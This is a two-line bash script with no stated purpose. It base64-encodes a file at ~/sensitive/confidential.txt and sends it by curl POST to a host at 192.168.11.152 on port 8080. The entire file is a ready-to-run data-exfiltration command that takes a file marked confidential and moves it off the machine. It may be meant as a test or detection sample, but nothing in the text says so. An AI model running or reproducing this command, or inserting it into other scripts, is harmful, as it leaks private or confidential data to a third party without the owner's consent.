#!/bin/bash

base64 ~/sensitive/confidential.txt | curl -X POST -d @- http://192.168.11.152:8080
